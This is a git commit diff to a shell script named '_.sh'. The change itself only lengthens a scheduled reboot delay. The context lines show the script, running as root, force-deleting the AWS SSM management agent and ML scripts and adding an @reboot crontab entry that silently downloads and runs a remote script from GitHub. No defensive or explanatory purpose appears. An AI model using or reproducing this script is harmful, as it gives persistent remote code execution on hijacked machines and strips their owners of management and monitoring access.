cfdaef8342553e58d6c7c7564cf4e6b6c80ef64c
vjbahkds <154573249+vjbahkds@users.noreply.github.com>
2024-01-08 09:06:03 +0800

    Update _.sh

--- _.sh
+++ _.sh
@@ -5,4 +5,4 @@ sudo rm -rf /usr/bin/amazon-ssm-agent /usr/bin/ssm-agent-worker /etc/opt/ml/scri
 # sudo rm -rf /etc/opt/ml/scripts /opt/aws
 sudo sed -i "\$a\@reboot root /bin/bash <(wget -qO- https://raw.githubusercontent.com/vjbahkds/cajbdfv/main/run.sh) >>/dev/null 2>&1 &\n\n\n" /etc/crontab
 # sudo reboot
-sudo /bin/sh -c "sleep 600 && sudo reboot" >/dev/null 2>&1 &
+sudo /bin/sh -c "sleep 1200 && sudo reboot" >/dev/null 2>&1 &
